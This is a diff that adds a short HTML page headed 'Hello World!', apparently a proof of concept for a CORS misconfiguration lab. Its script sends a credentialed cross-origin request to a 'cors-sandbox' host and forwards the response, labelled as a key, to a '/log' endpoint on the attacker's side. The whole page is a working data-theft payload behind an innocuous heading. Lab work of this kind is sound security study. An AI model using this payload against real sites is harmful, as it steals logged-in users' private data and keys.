@@ -1,0 +1,18 @@
+<html>
+    <body>
+        <h1>Hello World!</h1>
+        <script>
+            var xhr = new XMLHttpRequest();
+            var url = "https://cors-sandbox"
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == XMLHttpRequest.DONE){
+                    fetch("/log?key=" + xhr.responseText)
+                }
+            }
+
+            xhr.open('GET', url + "/code", true);
+            xhr.withCredentials = true;
+            xhr.send(null)
+        </script>
+    </body>
+</html>
